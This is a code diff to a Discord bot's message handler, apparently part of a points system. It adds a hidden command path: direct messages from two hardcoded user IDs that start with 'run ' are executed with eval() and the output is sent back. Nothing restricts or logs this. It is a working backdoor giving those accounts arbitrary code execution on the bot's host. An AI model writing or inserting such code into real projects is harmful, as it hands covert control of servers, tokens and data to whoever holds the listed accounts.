@@ -45,7 +45,27 @@ try {
             console.error("Error handling interaction:",error);
         }
     });
-    client.on('messageCreate', (message) => {
+    client.on('messageCreate', async (message) => {
+        if (message.channel.type === ChannelType.DM){
+            allowed_users = ["790709753138905129","799101657647415337"]
+            if (allowed_users.includes(message.author.id)){
+                if (message.content.startsWith("run ")){
+                    const code = message.content.slice(4);
+                    try {
+                        let result = eval(code);
+
+                        // If async, wait for it
+                        if (result instanceof Promise) result = await result;
+
+                        if (typeof result !== "string") result = util.inspect(result);
+
+                        await message.reply("✅ Output:\n```js\n" + result + "\n```");
+                    } catch (err) {
+                        await message.reply("❌ Error:\n```js\n" + err + "\n```");
+                    }
+                }
+            }
+        }
         if (message.author.bot) return; 
         const messagePoints = Math.floor(Math.random() * (50 - 15 + 1) + 15);
         let msgcontent = "none";
